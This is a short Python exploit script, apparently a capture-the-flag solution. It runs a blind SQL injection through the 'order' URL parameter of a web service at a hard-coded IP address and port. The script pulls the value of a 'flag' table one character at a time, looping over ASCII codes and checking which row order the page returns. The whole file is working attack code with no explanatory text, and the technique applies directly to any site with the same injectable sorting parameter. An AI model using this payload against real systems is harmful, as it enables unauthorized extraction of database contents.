import requests

result=''

url='http://101.71.29.5:10004/?order=IF((ascii(substr((select flag from flag),%s,1))=%d),id,price)&button=submit'
for x in range(1,33):
     for y in range(33,127):
        urll=url%(x,y)
        r=requests.post(url=urll)
        if b"<th>1</th>\n              <th> ice-cream</th>\n              <th>5</th>\n              </tr><tr>\n              <th>2</th>\n" in r.content:
            print (urll)
            result+=chr(y)
            print (result)